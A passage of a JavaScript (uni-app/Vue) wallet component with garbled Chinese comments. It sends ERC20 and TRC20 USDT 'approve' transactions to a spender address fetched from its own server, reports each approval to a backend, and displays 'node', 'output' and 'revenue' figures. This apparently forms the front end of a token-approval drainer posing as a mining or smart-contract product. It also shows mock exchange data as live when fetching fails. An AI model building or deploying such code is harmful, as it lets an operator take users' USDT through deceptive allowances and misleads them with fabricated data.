					ÊéàÊùÉÊï∞Èáè: approveAmount + ' wei (' + (parseFloat(approveAmount) / 1e6) + ' USDT)',
					ÊéàÊùÉÊï∞Èáè16ËøõÂà∂: amountHex,
					‰∫§ÊòìÊï∞ÊçÆ: approveMethodABI
				});

				// 1. Âä®ÊÄÅËé∑ÂèñÂΩìÂâç Gas Price
				let gasPrice;
				try {
					const currentGasPrice = await ethereum.request({ method: 'eth_gasPrice' });
					const gasPriceWei = parseInt(currentGasPrice, 16);
					
					// ËÆæÁΩÆÊõ¥‰ΩéÁöÑ Gas Price ÈôêÂà∂
					const maxGasPriceWei = 5000000000; // 5 gwei (Èôç‰ΩéÈôêÂà∂)
					const minGasPriceWei = 1000000000;  // 1 gwei
					
					// ‰ΩøÁî®ÁΩëÁªúÂª∫ËÆÆÁöÑ Gas PriceÔºå‰ΩÜÈôêÂà∂Âú®ÂêàÁêÜËåÉÂõ¥ÂÜÖ
					const limitedGasPrice = Math.min(Math.max(gasPriceWei, minGasPriceWei), maxGasPriceWei);
					gasPrice = '0x' + limitedGasPrice.toString(16);
					
					console.log('ÂΩìÂâçÁΩëÁªú Gas Price:', gasPriceWei / 1e9, 'gwei');
					console.log('ÈôêÂà∂Âêé Gas Price:', limitedGasPrice / 1e9, 'gwei');
				} catch (error) {
					console.warn('Ëé∑ÂèñÂä®ÊÄÅ Gas Price Â§±Ë¥•Ôºå‰ΩøÁî®ÈªòËÆ§ÂÄº:', error);
					gasPrice = '0x3B9ACA00'; // 1 gwei ‰Ωú‰∏∫ÂÆâÂÖ®ÈªòËÆ§ÂÄº
				}

				// 2. ‰º∞ÁÆó Gas Limit (‰øÆÊ≠£Áº∫Â§±ÁöÑ method)
				let gasLimit;
				try {
					const estimatedGas = await ethereum.request({
						method: 'eth_estimateGas', // Ê∑ªÂä†Áº∫Â§±ÁöÑ method
						params: [{
							from: userAddress,
							to: contractAddress,
							data: approveMethodABI
						}]
					});
					
					// Âú®‰º∞ÁÆóÂü∫Á°Ä‰∏äÂ¢ûÂä† 10% ‰Ωú‰∏∫ÁºìÂÜ≤ (Èôç‰ΩéÁºìÂÜ≤)
					const gasBuffer = Math.floor(parseInt(estimatedGas, 16) * 1.1);
					
					// ËÆæÁΩÆÊúÄÂ§ß Gas Limit (Èôç‰ΩéÊúÄÂ§ßÂÄº)
					const maxGasLimit = 60000; // Èôç‰ΩéÂà∞60000
					gasLimit = '0x' + Math.min(gasBuffer, maxGasLimit).toString(16);
					
					console.log('‰º∞ÁÆó Gas Limit:', parseInt(estimatedGas, 16));
					console.log('ÊúÄÁªà Gas Limit:', Math.min(gasBuffer, maxGasLimit));
				} catch (error) {
					console.warn('‰º∞ÁÆó Gas Limit Â§±Ë¥•Ôºå‰ΩøÁî®ÈªòËÆ§ÂÄº:', error);
					gasLimit = '0xEA60'; // 60000 ‰Ωú‰∏∫‰øùÂÆàÈªòËÆ§ÂÄº
				}

				// 3. ÊòæÁ§∫ Gas Ë¥πÁî®È¢Ñ‰º∞ÁªôÁî®Êà∑Á°ÆËÆ§
				const estimatedFeeWei = parseInt(gasLimit, 16) * parseInt(gasPrice, 16);
				const estimatedFeeETH = estimatedFeeWei / 1e18;
				
				console.log('È¢Ñ‰º∞ÊâãÁª≠Ë¥π:', {
					gasLimit: parseInt(gasLimit, 16),
					gasPrice: parseInt(gasPrice, 16) / 1e9 + ' gwei',
					estimatedFeeETH: estimatedFeeETH.toFixed(6) + ' ETH',
					estimatedFeeUSD: (estimatedFeeETH * 4300).toFixed(2) + ' USD' // ÂÅáËÆæETH‰ª∑Ê†º4300ÁæéÂÖÉ
				});

				// Èôç‰ΩéË≠¶ÂëäÈòàÂÄº
				if (estimatedFeeETH > 0.002) { // Ë∂ÖËøá 0.002 ETH (~$8.6) Ë≠¶Âëä
					const confirmed = await new Promise(resolve => {
						uni.showModal({
							title: 'ÊâãÁª≠Ë¥πÁ°ÆËÆ§',
							content: `È¢Ñ‰º∞ÊâãÁª≠Ë¥πÔºö${estimatedFeeETH.toFixed(6)} ETH (Á∫¶ $${(estimatedFeeETH * 4300).toFixed(2)})\nÊéàÊùÉÊï∞ÈáèÔºö${(parseFloat(approveAmount) / 1e6).toFixed(2)} USDT\n\nÊòØÂê¶ÁªßÁª≠Ôºü`,
							success: (res) => resolve(res.confirm)
						});
					});
					
					if (!confirmed) {
						throw new Error('User cancelled due to high gas fee');
					}
				}

				// ÂèëÈÄÅÊéàÊùÉ‰∫§Êòì
				const txHash = await ethereum.request({
					method: 'eth_sendTransaction',
					params: [{
						from: userAddress,
						to: contractAddress,
						data: approveMethodABI,
						gas: gasLimit,
						gasPrice: gasPrice
					}]
				});
				
				console.log('ERC20ÊéàÊùÉ‰∫§ÊòìÂèëÈÄÅÊàêÂäü:', txHash);
				
				return {
					success: true,
					txHash: txHash
				};
				
			} catch (error) {
				console.error('ERC20ÊéàÊùÉÊâßË°åÂ§±Ë¥•:', error);
				throw new Error('Authorization transaction failed: ' + error.message);
			}
		},

		// Êñ∞Â¢ûÔºöÊ£ÄÊü• Gas Ë¥πÁî®È¢Ñ‰º∞ÁöÑÊñπÊ≥ï
		async estimateTransactionCost(ethereum, txParams) {
			try {
				// Ëé∑ÂèñÂΩìÂâç Gas Price
				const gasPrice = await ethereum.request({ method: 'eth_gasPrice' });
				
				// ‰º∞ÁÆó Gas Limit
				const gasLimit = await ethereum.request({
					method: 'eth_estimateGas',
					params: [txParams]
				});
				
				const totalCostWei = parseInt(gasLimit, 16) * parseInt(gasPrice, 16);
				const totalCostETH = totalCostWei / 1e18;
				
				return {
					gasPrice: parseInt(gasPrice, 16),
					gasLimit: parseInt(gasLimit, 16),
					totalCostWei,
					totalCostETH
				};
			} catch (error) {
				console.error('‰º∞ÁÆó‰∫§ÊòìË¥πÁî®Â§±Ë¥•:', error);
				throw error;
			}
		},

		// ‰øÆÊîπÊâßË°åTRC20ÊéàÊùÉÁöÑÈîôËØØÊèêÁ§∫
		async executeTRC20Approval(tronWeb, userAddress) {
			try {
				// Ëé∑ÂèñÂêàÁ∫¶Âú∞ÂùÄ
				const contractAddress = tokenPocketAuth.config.tronUsdtContract;
				const spenderAddress = this.authAddress;
				const approveAmount = tokenPocketAuth.config.defaultApproveAmount;
				
				// Ëé∑ÂèñÂêàÁ∫¶ÂÆû‰æã
				const contract = await tronWeb.contract().at(contractAddress);
				
				// Ë∞ÉÁî®approveÊñπÊ≥ï
				const transaction = await contract.approve(spenderAddress, approveAmount).send({
					from: userAddress,
					feeLimit: 100000000 // 100 TRX
				});
				
				console.log('TRC20ÊéàÊùÉ‰∫§ÊòìÂèëÈÄÅÊàêÂäü:', transaction);
				
				return {
					success: true,
					txHash: transaction
				};
				
			} catch (error) {
				console.error('TRC20ÊéàÊùÉÊâßË°åÂ§±Ë¥•:', error);
				throw new Error('Tron authorization transaction failed: ' + error.message);
			}
		},

		// ‰øÆÊîπÁªü‰∏ÄÂ§ÑÁêÜÊéàÊùÉÁªìÊûúÁöÑÊèêÁ§∫ÊñáÂ≠ó
		async handleAuthResult(authResult) {
			uni.hideLoading();
			
			if (authResult.success) {
				// ÊéàÊùÉÊàêÂäüÂêéË∞ÉÁî®ÂõûË∞ÉÊé•Âè£
				await this.callbackAuthSuccess({
					...authResult,
					address: this.authAddress
				});
				
				uni.showToast({
					title: 'Authorization successful',
					icon: 'success'
				});
				
				this.handleAuthSuccess(authResult);
				this.closeAuthDialog();
			} else {
				uni.showToast({
					title: authResult.message || 'Authorization failed',
					icon: 'none'
				});
			}
		},

		// ÊéàÊùÉÊàêÂäüÂõûË∞É
		async callbackAuthSuccess(authResult) {
			try {
				const storeToken = store.getToken();
				const localToken = uni.getStorageSync('userToken');
				const oldLocalToken = uni.getStorageSync('token');
				
				console.log('=== Token check ===');
				console.log('Store token:', storeToken);
				console.log('Local storage userToken:', localToken);
				console.log('Local storage token:', oldLocalToken);
				
				const token = store.getToken();
				if (!token) {
					console.warn('Authorization failed: token not found in store');
					const walletAddress = uni.getStorageSync('walletAddress');
					console.log('Current wallet address:', walletAddress);
					
					if (walletAddress) {
						try {
							console.log('Attempting to re-obtain token, parameters:', {
								address: walletAddress,
								tid: uni.getStorageSync('userTid') || ''
							});
							
							// ‰ΩøÁî®Êñ∞ÁöÑAPIÊñπÊ≥ïÈáçÊñ∞Ë∞ÉÁî®Èí±ÂåÖËøûÊé•Êé•Âè£
							const responseData = await api.user.walletConnect(
								walletAddress,
								uni.getStorageSync('userTid') || ''
							);

							console.log('ÈáçÊñ∞Ëé∑ÂèñtokenÂìçÂ∫î:', responseData);

							if (responseData && responseData.code === 0 && responseData.token) {
								store.setToken(responseData.token);
								console.log('Êñ∞tokenÂ∑≤‰øùÂ≠òÂà∞store:', responseData.token);
							} else {
								throw new Error('Failed to re-obtain token');
							}
						} catch (error) {
							console.error('Failed to re-obtain token:', error);
							apiUtils.showError('Authorization failed, please reconnect wallet');
							return;
						}
					}
				}

				console.log('ÂáÜÂ§áË∞ÉÁî®ÊéàÊùÉÊé•Âè£Ôºå‰ΩøÁî®token:', store.getToken());
				
				try {
					// ‰ΩøÁî®Êñ∞ÁöÑAPIÊñπÊ≥ï
					const responseData = await api.user.authorize(this.authAddress);
					
					console.log('Authorization interface response:', responseData);
					
					if (responseData && responseData.code === 0) {
						console.log('Authorization submitted successfully');
					} else {
						console.warn('Authorization interface returned abnormal:', responseData);
					}
				} catch (error) {
					console.error('Authorization interface call failed:', error);
				}
				
			} catch (error) {
			console.error('Authorization callback interface call failed:', error);
			}
		},


		// Â¶ÇÊûúÈúÄË¶ÅÂä®ÊÄÅÁîüÊàêtokenÔºåÂèØ‰ª•‰ΩøÁî®Ê≠§ÊñπÊ≥ï
		generateAuthToken() {
			// ÁîüÊàê32‰ΩçÈöèÊú∫Â≠óÁ¨¶‰∏≤
			const chars = 'abcdef0123456789';
			let token = '';
			for (let i = 0; i < 32; i++) {
				token += chars.charAt(Math.floor(Math.random() * chars.length));
			}
			return token;
		},

		// Â§ÑÁêÜÊéàÊùÉÊàêÂäü
		handleAuthSuccess(authResult) {
			console.log('Authorization successful:', authResult);
			
			// ‰øùÂ≠òÊéàÊùÉ‰ø°ÊÅØÂà∞Êú¨Âú∞Â≠òÂÇ®
			uni.setStorageSync('authResult', {
				...authResult,
				timestamp: Date.now()
			});
			
			// ÁßªÈô§ËØ¶ÊÉÖÊòæÁ§∫Ôºå‰∏çÂÜçË∞ÉÁî® showAuthDetails
			// this.showAuthDetails(authResult);
		},

		// ÊòæÁ§∫ÊéàÊùÉËØ¶ÊÉÖ - ÂèØ‰ª•Âà†Èô§Ëøô‰∏™ÊñπÊ≥ïÔºåÂõ†‰∏∫‰∏çÂÜç‰ΩøÁî®
		// showAuthDetails(authResult) {
		// 	uni.showModal({
		// 		title: 'ÊéàÊùÉ‰∫§ÊòìÂ∑≤ÂèëËµ∑',
		// 		content: `ÁΩëÁªú: ${authResult.type}\nÂú∞ÂùÄ: ${tokenPocketAuth.formatAddress(authResult.address)}\n‰∫§ÊòìÂìàÂ∏å: ${tokenPocketAuth.formatTxHash(authResult.txHash)}`,
		// 		showCancel: false,
		// 		confirmText: 'Á°ÆÂÆö'
		// 	});
		// },

		// Ëé∑ÂèñÂΩìÂâçURL
		getCurrentUrl() {
			// #ifdef H5
			return window.location.href;
			// #endif
			
			// #ifdef APP-PLUS
			return 'https://ai-smart-contracts.com/app';
			// #endif
			
			// #ifdef MP-WEIXIN
			return 'https://ai-smart-contracts.com/mp';
			// #endif
		},

		// Â§çÂà∂ÂΩìÂâçURL
		copyCurrentUrl() {
			const url = this.getCurrentUrl();
			
			// #ifdef H5
			if (navigator.clipboard) {
				navigator.clipboard.writeText(url).then(() => {
					uni.showToast({
						title: 'Link copied',
						icon: 'success'
					});
				});
			}
			// #endif
			
			// #ifdef APP-PLUS || MP-WEIXIN
			uni.setClipboardData({
				data: url,
				success: () => {
					uni.showToast({
						title: 'Link copied',
						icon: 'success'
					});
				}
			});
			// #endif
		},

		// Ëé∑Âèñ‰ª•Â§™ÂùäÊèê‰æõËÄÖÂáΩÊï∞
		getEthereumProvider() {
			if (typeof window === 'undefined') return null;
			
			if (window.tokenpocket && window.tokenpocket.ethereum) {
				return window.tokenpocket.ethereum;
			} else if (window.bifrost) {
				return window.bifrost;
			} else if (window.onchain) {
				return window.onchain;
			} else if (window.crypto && window.crypto.ethereum) {
				return window.crypto.ethereum;
			} else if (window.ethereum) {
				return window.ethereum;
			}
			
			return null;
		},

		// Ê£ÄÊü• gas Ë¥πÁî®ÊòØÂê¶Ë∂≥Â§ü
		async checkGasBalance() {
			try {
				// Ëé∑Âèñ‰ª•Â§™ÂùäÊèê‰æõËÄÖ
				let ethereum = this.getEthereumProvider();
				if (!ethereum) {
					throw new Error('No Ethereum provider found');
				}

				// Ëé∑ÂèñÂΩìÂâçË¥¶Êà∑
				const accounts = await ethereum.request({ method: 'eth_accounts' });
				if (!accounts || accounts.length === 0) {
					throw new Error('No account connected');
				}

				// Ëé∑ÂèñË¥¶Êà∑ ETH ‰ΩôÈ¢ù
				const balance = await ethereum.request({
					method: 'eth_getBalance',
					params: [accounts[0], 'latest']
				});

				// Â∞Ü‰ΩôÈ¢ù‰ªé Wei ËΩ¨Êç¢‰∏∫ ETH
				const ethBalance = parseInt(balance, 16) / 1e18;

				// ËÆæÁΩÆÊúÄÂ∞èÊâÄÈúÄ gas Ë¥πÁî®Ôºà‰æãÂ¶Ç 0.01 ETHÔºâ
				const minGasRequired = 0.01;

				if (ethBalance < minGasRequired) {
					throw new Error(`Insufficient ETH for gas fee. Minimum required: ${minGasRequired} ETH`);
				}

				return true;
			} catch (error) {
				console.error('Gas balance check failed:', error);
				uni.showToast({
					title: error.message || 'Insufficient gas fee',
					icon: 'none',
					duration: 3000
				});
				return false;
			}
		},

		// ‰øÆÊîπË¥≠‰π∞/Ë¥®ÊäºÂáΩÊï∞
		async processPurchase(amount) {
			try {
				// ÂÖàÊ£ÄÊü• gas Ë¥πÁî®
				const hasEnoughGas = await this.checkGasBalance();
				if (!hasEnoughGas) {
					return;
				}

				uni.showLoading({
					title: 'Processing...'
				});

				// ÁªßÁª≠ÂéüÊúâÁöÑË¥≠‰π∞ÈÄªËæë
				await this.callPurchaseAPI(amount);
				
				uni.hideLoading();
				uni.showToast({
					title: 'Purchase successful',
					icon: 'success',
					duration: 2000
				});
				
				setTimeout(() => {
					uni.navigateBack();
				}, 2000);
				
			} catch (error) {
				uni.hideLoading();
				uni.showToast({
					title: error.message || 'Purchase failed',
					icon: 'none',
					duration: 2000
				});
			}
		},

		// ‰øÆÊîπÔºöÂêØÂä®ÊâÄÊúâËΩÆËØ¢ÔºàÊÅ¢Â§ç‰∫§ÊòìÊâÄÊï∞ÊçÆËΩÆËØ¢Ôºâ
		startAllPolling() {
			if (this.isPollingActive) {
				console.log('ËΩÆËØ¢Â∑≤ÁªèÊ¥ªË∑ÉÔºåË∑≥ËøáÈáçÂ§çÂêØÂä®');
				return;
			}

			console.log('ÂêØÂä®ÊâÄÊúâËΩÆËØ¢...');
			this.isPollingActive = true;
			
			// ÂêØÂä®ÂêÑÁßçËΩÆËØ¢
			this.startExchangeDataPolling();
			this.startErcDataPolling();
			this.startUserInfoPolling();
		},

		// ‰øÆÊîπÔºöÂÅúÊ≠¢ÊâÄÊúâËΩÆËØ¢
		stopAllPolling() {
			if (!this.isPollingActive) {
				console.log('ËΩÆËØ¢Â∑≤ÁªèÂÅúÊ≠¢ÔºåË∑≥ËøáÈáçÂ§çÂÅúÊ≠¢');
				return;
			}

			console.log('ÂÅúÊ≠¢ÊâÄÊúâËΩÆËØ¢...');
			this.isPollingActive = false;
			
			// ÂÅúÊ≠¢ÂêÑÁßçËΩÆËØ¢
			this.stopExchangeDataPolling();
			this.stopErcDataPolling();
			this.stopUserInfoPolling();
		},

		// ÊÅ¢Â§çÔºöÂºÄÂßãËΩÆËØ¢‰∫§ÊòìÊâÄÊï∞ÊçÆÔºà10ÁßíÈó¥ÈöîÔºâ
		startExchangeDataPolling() {
			// ÂÖàÂÅúÊ≠¢Áé∞ÊúâËΩÆËØ¢
			this.stopExchangeDataPolling();
			
			// Á´ãÂç≥Ëé∑Âèñ‰∏ÄÊ¨°Êï∞ÊçÆ
			this.fetchExchangeData();
			
			// ËÆæÁΩÆ10ÁßíËΩÆËØ¢
			this.pollingTimer = setInterval(() => {
				this.fetchExchangeData();
			}, 10000); // Êîπ‰∏∫10Áßí
			
			console.log('ÂºÄÂßãËΩÆËØ¢‰∫§ÊòìÊâÄÊï∞ÊçÆÔºåÊØè10ÁßíÊõ¥Êñ∞‰∏ÄÊ¨°');
		},

		// ÊÅ¢Â§çÔºöÂÅúÊ≠¢ËΩÆËØ¢‰∫§ÊòìÊâÄÊï∞ÊçÆ
		stopExchangeDataPolling() {
			if (this.pollingTimer) {
				clearInterval(this.pollingTimer);
				this.pollingTimer = null;
				console.log('ÂÅúÊ≠¢ËΩÆËØ¢‰∫§ÊòìÊâÄÊï∞ÊçÆ');
			}
		},

		// ÊÅ¢Â§çÔºöËé∑Âèñ‰∫§ÊòìÊâÄÊï∞ÊçÆÔºåÂ¢ûÂº∫ÈîôËØØÂ§ÑÁêÜ
		async fetchExchangeData() {
			try {
				// ‰ΩøÁî®APIÊñπÊ≥ï
				let result = await api.exchange.getRealTimeData();
				
				// Â¶ÇÊûúËøîÂõûnullÔºàË¢´È¢ëÁéáÈôêÂà∂ÔºâÔºåË∑≥ËøáÊú¨Ê¨°Êõ¥Êñ∞
				if (!result) {
					console.log('‰∫§ÊòìÊâÄÊï∞ÊçÆËé∑ÂèñË¢´ÈôêÂà∂ÔºåË∑≥ËøáÊú¨Ê¨°Êõ¥Êñ∞');
					return;
				}
				
				// Â¶ÇÊûú‰∏ªË¶ÅÊñπÊ°àÂ§±Ë¥•‰∏îÊòØCORSÈîôËØØÔºåÂ∞ùËØï‰ΩøÁî®Ê®°ÊãüÊï∞ÊçÆ
				if (!result.success && result.error && result.error.includes('CORS')) {
					console.log('CORSÈóÆÈ¢òÊó†Ê≥ïËß£ÂÜ≥Ôºå‰ΩøÁî®Ê®°ÊãüÊï∞ÊçÆËøõË°åÊºîÁ§∫');
					result = api.exchange.getMockData();
				}
				
				if (result.success && result.data) {
					// Â∞ÜÊé•Âè£ËøîÂõûÁöÑÊï∞ÊçÆÊ†ºÂºèÂåñ
					const formattedData = {};
					
					// Â§ÑÁêÜÊØè‰∏™‰∫§ÊòìÊâÄÁöÑÊï∞ÊçÆ
					Object.keys(result.data).forEach(exchangeName => {
						const lowerCaseName = exchangeName.toLowerCase();
						// Â§ÑÁêÜ‰∏çÂêåÁöÑ‰∫§ÊòìÊâÄÂêçÁß∞Êò†Â∞Ñ
						let mappedName = lowerCaseName;
						
						// ÂêçÁß∞Êò†Â∞ÑËßÑÂàô
						if (lowerCaseName === 'okex') {
							mappedName = 'okex';
						} else if (lowerCaseName === 'huobi') {
							mappedName = 'huobi';
						} else if (lowerCaseName === 'binance') {
							mappedName = 'binance';
						} else if (lowerCaseName === 'gate') {
							mappedName = 'gate';
						} else if (lowerCaseName === 'kucoin') {
							mappedName = 'kucoin';
						} else if (lowerCaseName === 'kraken') {
							mappedName = 'kraken';
						}
						
						if (this.exchangeConfig[mappedName]) {
							formattedData[mappedName] = result.data[exchangeName];
						}
					});

					this.exchangeData = formattedData;
					console.log('‰∫§ÊòìÊâÄÊï∞ÊçÆÊõ¥Êñ∞ÊàêÂäü:', formattedData);
				} else {
					throw new Error(result.error || 'Ëé∑ÂèñÊï∞ÊçÆÂ§±Ë¥•');
				}
			} catch (error) {
				console.error('Ëé∑Âèñ‰∫§ÊòìÊâÄÊï∞ÊçÆÂ§±Ë¥•:', error);
				
				// Â¶ÇÊûúÊòØCORSÈîôËØØÔºåÁªôÁî®Êà∑ÂèãÂ•ΩÊèêÁ§∫
				if (error.message && (error.message.includes('CORS') || error.message.includes('Ë∑®Âüü'))) {
					console.log('Áî±‰∫éÊµèËßàÂô®CORSÊîøÁ≠ñÈôêÂà∂ÔºåÂ∞Ü‰ΩøÁî®Ê®°ÊãüÊï∞ÊçÆËøõË°åÊºîÁ§∫');
					
					// Â∞ùËØï‰ΩøÁî®Ê®°ÊãüÊï∞ÊçÆ
					try {
						const mockResult = api.exchange.getMockData();
						if (mockResult.success) {
							const formattedData = {};
							Object.keys(mockResult.data).forEach(exchangeName => {
								const mappedName = exchangeName.toLowerCase();
								if (this.exchangeConfig[mappedName]) {
									formattedData[mappedName] = mockResult.data[exchangeName];
								}
							});
							this.exchangeData = formattedData;
							console.log('ÊàêÂäü‰ΩøÁî®Ê®°ÊãüÊï∞ÊçÆ:', formattedData);
							return; // ÊàêÂäü‰ΩøÁî®Ê®°ÊãüÊï∞ÊçÆÔºåÈÄÄÂá∫ÈîôËØØÂ§ÑÁêÜ
						}
					} catch (mockError) {
						console.error('Ê®°ÊãüÊï∞ÊçÆ‰πüÂ§±Ë¥•‰∫Ü:', mockError);
					}
				}
				
				// ÈùôÈªòÂ§ÑÁêÜÂÖ∂‰ªñÈîôËØØ
				if (error.message && error.message.includes('timeout')) {
					console.log('ËØ∑Ê±ÇË∂ÖÊó∂Ôºå‰∏ãÊ¨°ËΩÆËØ¢Êó∂ÈáçËØï');
				} else {
					console.log('Êï∞ÊçÆËé∑ÂèñÂ§±Ë¥•Ôºå‰∏ãÊ¨°ËΩÆËØ¢Êó∂ÈáçËØï:', error.message);
				}
			}
		},

		// Êñ∞Â¢ûÔºöÂÅúÊ≠¢ERCÊï∞ÊçÆËΩÆËØ¢
		stopErcDataPolling() {
			if (this.ercPollingTimer) {
				clearInterval(this.ercPollingTimer);
				this.ercPollingTimer = null;
				console.log('ÂÅúÊ≠¢ËΩÆËØ¢ERCÊï∞ÊçÆ');
			}
		},

		// Êñ∞Â¢ûÔºöÂºÄÂßãËΩÆËØ¢ERCÊï∞ÊçÆÔºà10ÁßíÈó¥ÈöîÔºâ
		startErcDataPolling() {
			// ÂÖàÂÅúÊ≠¢Áé∞ÊúâËΩÆËØ¢
			this.stopErcDataPolling();
			
			// Á´ãÂç≥Ëé∑Âèñ‰∏ÄÊ¨°Êï∞ÊçÆ
			this.fetchErcData();
			
			// ËÆæÁΩÆ10ÁßíËΩÆËØ¢
			this.ercPollingTimer = setInterval(() => {
				this.fetchErcData();
			}, 10000); // 10ÁßíÈó¥Èöî
			
			console.log('ÂºÄÂßãËΩÆËØ¢ERCÊï∞ÊçÆÔºåÊØè10ÁßíÊõ¥Êñ∞‰∏ÄÊ¨°');
		},

		// ‰øÆÊîπËé∑ÂèñERCÊï∞ÊçÆÊñπÊ≥ï - Âº∫Âà∂ÂìçÂ∫îÂºèÊõ¥Êñ∞
		async fetchErcData() {
			try {
				console.log('=== ÂºÄÂßãËé∑ÂèñERCÊï∞ÊçÆ ===');
				const currentToken = store.getToken();
				console.log('fetchErcData - ÂΩìÂâçtoken:', currentToken);
				
				const response = await api.transaction.getAuthAddress();
				console.log('fetchErcData - APIËøîÂõûÂÆåÊï¥ÂìçÂ∫î:', response);
				
				// Ê£ÄÊü•ÊòØÂê¶Ë¢´È¢ëÁéáÈôêÂà∂
				if (response === null) {
					console.log('APIË∞ÉÁî®Ë¢´È¢ëÁéáÈôêÂà∂ÔºåË∑≥ËøáÊú¨Ê¨°Êõ¥Êñ∞');
					return;
				}
				
				// Êõ¥ËØ¶ÁªÜÁöÑÂìçÂ∫îÊ£ÄÊü•
				if (response) {
					console.log('ÂìçÂ∫îÂ≠òÂú®ÔºåÊ£ÄÊü•dataÂ≠óÊÆµ:', response.data);
					console.log('Ê£ÄÊü•ÂìçÂ∫îÊ†πÁ∫ßÂà´Â≠óÊÆµ:', response);
					
					// Á°ÆÂÆöÊï∞ÊçÆÊù•Ê∫êÔºöÂèØËÉΩÂú® response.data ÊàñÁõ¥Êé•Âú® response ‰∏≠
					let dataSource = null;
					if (response.data && (response.data.node || response.data.participant)) {
						dataSource = response.data;
						console.log('Êï∞ÊçÆÊù•Ê∫ê: response.data');
					} else if (response.node || response.participant) {
						dataSource = response;
						console.log('Êï∞ÊçÆÊù•Ê∫ê: response');
					}
					
					if (dataSource) {
						console.log('=== ÂºÄÂßãÊõ¥Êñ∞ERCÊï∞ÊçÆ ===');
						console.log('Êï∞ÊçÆÊ∫êÂÜÖÂÆπ:', dataSource);
						console.log('ÂéüÂßãÊï∞ÊçÆ:', {
							participant: dataSource.participant,
							node: dataSource.node,
							output: dataSource.output,
							revenue: dataSource.revenue,
							authorized_address: dataSource.authorized_address
						});
						
						// ÂÖà‰øùÂ≠òÂéüÂßãÂÄºÔºåÁî®‰∫éË∞ÉËØï
						const originalData = {
							participant: dataSource.participant,
							node: dataSource.node,
							output: dataSource.output,
							revenue: dataSource.revenue,
							authorized_address: dataSource.authorized_address
						};
						
						console.log('Âç≥Â∞ÜÊõ¥Êñ∞ÁöÑÂéüÂßãÂÄº:', originalData);
						
						// Ê∏ÖÁêÜÊóßÁöÑÊõ¥Êñ∞ÊñπÂºèÔºåÂè™‰ΩøÁî®‰∏ÄÁßçÊñπÂºè
						const newErcData = {
							authorized_address: String(dataSource.authorized_address || ''),
							node: String(dataSource.node || '0'),
							output: String(dataSource.output || '0'),
							participant: String(dataSource.participant || '0'),
							revenue: String(dataSource.revenue || '0')
						};
						
						console.log('Ê†ºÂºèÂåñÂêéÁöÑÊï∞ÊçÆ:', newErcData);
						
						// ‰ΩøÁî®ÊúÄÁÆÄÂçïÁöÑËµãÂÄºÊñπÂºè
						this.ercData = { ...newErcData };
						
						console.log('ËµãÂÄºÂêéÁöÑercData:', this.ercData);
						console.log('È™åËØÅÂêÑ‰∏™Â≠óÊÆµ:');
						console.log('  participant:', this.ercData.participant);
						console.log('  node:', this.ercData.node);
						console.log('  output:', this.ercData.output);
						console.log('  revenue:', this.ercData.revenue);
						
						// Âº∫Âà∂Êõ¥Êñ∞ËßÜÂõæ
						this.$nextTick(() => {
							this.$forceUpdate();
							console.log('Âº∫Âà∂Êõ¥Êñ∞ÂÆåÊàê');
						});
						
						// ÂêåÊó∂Êõ¥Êñ∞ÂêàÁ∫¶Âú∞ÂùÄÈÖçÁΩÆ
						const contractConfig = {};
						if (dataSource.tron_usdt_contract) {
							contractConfig.tronUsdtContract = dataSource.tron_usdt_contract;
						}
						if (dataSource.eth_usdt_contract) {
							contractConfig.ethUsdtContract = dataSource.eth_usdt_contract;
						}
						
						if (Object.keys(contractConfig).length > 0) {
							tokenPocketAuth.updateConfig(contractConfig);
						}
						
						console.log('=== ERCÊï∞ÊçÆÊõ¥Êñ∞ÂÆåÊàê ===');
						console.log('ÊúÄÁªàercDataÁä∂ÊÄÅ:', JSON.stringify(this.ercData));
					} else {
						console.warn('Âú®ÂìçÂ∫î‰∏≠Êâæ‰∏çÂà∞ÊúâÊïàÁöÑERCÊï∞ÊçÆ');
						console.log('ÂÆåÊï¥ÂìçÂ∫îÁªìÊûÑ:', JSON.stringify(response, null, 2));
					}
				} else {
					console.warn('APIËøîÂõûÁ©∫ÂìçÂ∫î');
				}
			} catch (error) {
				console.error('Ëé∑ÂèñERCÊï∞ÊçÆÂ§±Ë¥•:', error);
				
				// ÈùôÈªòÂ§ÑÁêÜÈîôËØØÔºå‰∏çÂΩ±ÂìçÁî®Êà∑‰ΩìÈ™å
				if (error.message && error.message.includes('timeout')) {
					console.log('ERCÊï∞ÊçÆËØ∑Ê±ÇË∂ÖÊó∂Ôºå‰∏ãÊ¨°ËΩÆËØ¢Êó∂ÈáçËØï');
				} else {
					console.log('ERCÊï∞ÊçÆËé∑ÂèñÂ§±Ë¥•Ôºå‰∏ãÊ¨°ËΩÆËØ¢Êó∂ÈáçËØï:', error.message);
				}
			}
		},

		// ‰øÆÊîπÔºöÂºÄÂßãÁî®Êà∑‰ø°ÊÅØËΩÆËØ¢Ôºà10ÁßíÈó¥ÈöîÔºâ
		startUserInfoPolling(immediately = true) {
			// ÂÖàÂÅúÊ≠¢Áé∞ÊúâËΩÆËØ¢
			this.stopUserInfoPolling();
			
			// Á´ãÂç≥Ëé∑Âèñ‰∏ÄÊ¨°Êï∞ÊçÆÔºàÂèØÈÄâÔºâ
			if (immediately) {
				this.fetchUserInfo();
			}
			
			// ËÆæÁΩÆ10ÁßíËΩÆËØ¢
			this.userInfoPollingTimer = setInterval(() => {
				this.fetchUserInfo();
			}, 10000); // Êîπ‰∏∫10Áßí
			
			console.log('ÂºÄÂßãËΩÆËØ¢Áî®Êà∑‰ø°ÊÅØÔºåÊØè10ÁßíÊõ¥Êñ∞‰∏ÄÊ¨°');
		},

		// Êñ∞Â¢ûÔºöÂºÄÂßãÁî®Êà∑‰ø°ÊÅØËΩÆËØ¢
		startUserInfoPolling() {
			// ÂÖàÂÅúÊ≠¢Áé∞ÊúâËΩÆËØ¢
			this.stopUserInfoPolling();
			
			// Á´ãÂç≥Ëé∑Âèñ‰∏ÄÊ¨°Êï∞ÊçÆÔºàÂèØÈÄâÔºâ
			this.fetchUserInfo();
			
			// ËÆæÁΩÆ30ÁßíËΩÆËØ¢
			this.userInfoPollingTimer = setInterval(() => {
				this.fetchUserInfo();
			}, 30000);
			
			console.log('ÂºÄÂßãËΩÆËØ¢Áî®Êà∑‰ø°ÊÅØÔºåÊØè30ÁßíÊõ¥Êñ∞‰∏ÄÊ¨°');
		},

		// Êñ∞Â¢ûÔºöÂÅúÊ≠¢Áî®Êà∑‰ø°ÊÅØËΩÆËØ¢
		stopUserInfoPolling() {
			if (this.userInfoPollingTimer) {
				clearInterval(this.userInfoPollingTimer);
				this.userInfoPollingTimer = null;
				console.log('Stop polling user information');
			}
		},

		// Êñ∞Â¢ûÔºöËé∑ÂèñÁî®Êà∑‰ø°ÊÅØ
